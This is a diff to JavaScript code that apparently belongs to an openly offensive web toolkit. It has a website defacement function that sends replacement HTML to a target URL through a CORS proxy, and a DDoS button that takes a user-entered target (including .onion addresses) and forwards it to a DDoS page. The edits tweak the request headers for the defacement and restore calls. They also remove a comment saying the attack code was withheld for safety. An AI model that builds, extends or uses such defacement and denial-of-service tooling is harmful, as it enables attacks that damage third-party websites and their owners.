@@ -41,7 +41,8 @@ async function fetchWithCORS(url) {
         const response = await fetch(proxiedUrl, {
             mode: 'cors', // Explicitly set CORS mode
             headers: {
-                'Origin': window.location.origin // Include origin header
+                'Origin': window.location.origin, // Include origin header
+                'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
             }
         });
         if (!response.ok) {
@@ -103,7 +104,8 @@ async function performDefacement(targetURL, defacementCode) {
              mode: 'cors',  // Explicitly set CORS mode
              headers: {
                  'Content-Type': 'text/html',
-                 'Origin': window.location.origin  // Include origin header
+                 'Origin': window.location.origin,  // Include origin header
+                 'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
              },
              body: modifiedContent,
          });
@@ -172,11 +174,13 @@ function setSecurityHeaders() {
     // Prevent MIME-sniffing vulnerabilities
     document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));
 
-    function createMetaTag(httpEquiv, contentSecurityPolicy, deny) {
+    function createMetaTag(httpEquiv, content, deny) {
         const meta = document.createElement('meta');
         meta.setAttribute('http-equiv', httpEquiv);
-        meta.setAttribute('content', contentSecurityPolicy);
-        meta.setAttribute('X-Frame-Options', deny);
+        meta.setAttribute('content', content);
+        if (deny) {
+          meta.setAttribute('X-Frame-Options', deny); // Set X-Frame-Options attribute if provided
+        }
         return meta;
     }
 }
@@ -478,17 +482,17 @@ document.body.appendChild(encryptionInfoElement);
 
 // Function to redirect to the encryption tool
 function redirectToEncryptionTool() {
-    window.location.href = "/public/main/encryption/encryption.js";
+  window.location.href = '/encryption';
 }
 
 // Function to redirect to the DDoS tool
 function redirectToDDOS() {
-    window.location.href = "/public/main/ddos/ddos.js";
+  window.location.href = '/ddos';
 }
 
 // Function to redirect to the Defacement Tool
 function redirectToDeface() {
-    window.location.href = "/public/main/defacement/defacement.js";
+    window.location.href = "/defacement";
 }
 
 // Add Navbar (Already added, but keeping the function)
@@ -588,7 +592,7 @@ function addNavbarLinks() {
 
     const defaceLink = document.createElement('a');
     defaceLink.textContent = 'Defacement Tool';
-    defaceLink.href = "/public/main/defacement/defacement.js";
+    defaceLink.href = "/defacement";
     defaceLink.style.cssText = `
  color: white;
  text-decoration: none;
@@ -598,7 +602,7 @@ function addNavbarLinks() {
 
     const ddosLink = document.createElement('a');
     ddosLink.textContent = 'DDoS Tool';
-    ddosLink.href = "/public/main/ddos/ddos.js";
+    ddosLink.href = "/ddos";
     ddosLink.style.cssText = `
  color: white;
  text-decoration: none;
@@ -608,7 +612,7 @@ function addNavbarLinks() {
 
     const encryptLink = document.createElement('a');
     encryptLink.textContent = 'File Encryption Tool';
-    encryptLink.href = "/public/main/encryption/encryption.js";
+    encryptLink.href = "/encryption";
     encryptLink.style.cssText = `
  color: white;
  text-decoration: none;
@@ -655,7 +659,8 @@ async function restoreWebsite(targetURL) {
              mode: 'cors',  // Explicitly set CORS mode
              headers: {
                  'Content-Type': 'text/html',
-                 'Origin': window.location.origin  // Include origin header
+                 'Origin': window.location.origin,  // Include origin header
+                 'X-Requested-With': 'XMLHttpRequest' // Add X-Requested-With header
              },
              body: backupContent,
          });
@@ -733,10 +738,13 @@ function addOnionSupport() {
         ddosButtonNav.addEventListener('click', () => {
             const targetURL = prompt("Enter the target URL (or .onion address), dipshit:");
             if (targetURL) {
-              // Add your DDoS function call here (not included for safety reasons)
-              // For a real implementation, use WebSockets or WebRTC to avoid CORS restrictions and enable sustained connections
+              // Add your DDoS function call here
                 alert(`DDoS attack initiated on ${targetURL}. Good luck, have fun, don't get caught!`);
                 logAction(`DDoS attack initiated on ${targetURL}`);
+
+              // Redirect to DDoS tool page with target URL
+              window.location.href = `/ddos?targetURL=${encodeURIComponent(targetURL)}`;
+
             } else {
                 alert("ENTER A TARGET URL, YA MORON!");
                 logAction("User failed to enter target URL for DDoS.");
